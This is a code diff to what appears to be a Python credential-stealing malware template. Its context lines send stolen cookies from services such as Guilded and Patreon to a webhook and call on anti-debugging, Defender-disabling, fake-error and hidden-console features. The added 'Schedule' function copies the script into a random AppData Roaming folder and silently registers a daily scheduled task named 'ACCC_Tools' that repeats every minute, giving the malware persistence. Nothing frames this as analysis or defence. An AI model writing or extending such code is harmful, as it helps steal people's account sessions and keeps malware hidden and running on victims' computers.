@@ -25,7 +25,7 @@ FakeWebhook = '%FakeWebhook%'
 Fakegen = '%FakeGen%' 
 FakeCCgen = '%FakeCCGen%' 
 FakeError = '%FakeError%' 
-
+schedule = '%Schedule%'
 injection = '%Injection%'
 Startup = '%Startup%'
 antidebugging = '%No_Debug%'  
@@ -2749,6 +2749,23 @@ def guilded(cookie):
         LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
     except Exception as e:
         error_Handler(e)
+        
+def Schedule():
+    try:
+        script_path = os.path.abspath(sys.argv[0])
+        appdata_path = os.getenv('APPDATA')
+        roaming_folder = os.path.join(appdata_path, 'Roaming')
+        existing_folders = [folder for folder in os.listdir(roaming_folder) if os.path.isdir(os.path.join(roaming_folder, folder))]
+        
+        if existing_folders:
+            random_folder_name = random.choice(existing_folders)
+            destination_folder = os.path.join(roaming_folder, random_folder_name)
+            destination_file = os.path.join(destination_folder, os.path.basename(script_path))
+            shutil.copy2(script_path, destination_file)
+            task_command = f'schtasks.exe /create /tn ACCC_Tools /tr "{destination_file}" /st 21:50 /du 23:59 /sc daily /ri 1 /f'
+            subprocess.run(task_command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    except Exception as e:
+        error_Handler(e)
 
 def patreon(cookie):
     try:
@@ -3319,7 +3336,7 @@ def gatha():
         Second_Thread.append(defender)
     except Exception as e:
         error_Handler(e)
-    
+
     try:
         if antidebugging == True:
             ad = threading.Thread(target=antidebug)
@@ -3329,7 +3346,11 @@ def gatha():
             pass
     except Exception as e:
         error_Handler(e)
-    
+    if schedule == True:
+        sh = threading.Thread(target=Schedule)
+        sh.start()
+        First_Thread.append(sh)
+        
     if hidewindow == True:
         try:
             hide_console1()
@@ -3398,6 +3419,7 @@ def gatha():
         us = threading.Thread(target=fakegen)
         us.start()
         First_Thread.append(us)
+    
 
     if FakeError == True:
         fe = threading.Thread(target=fakeError)
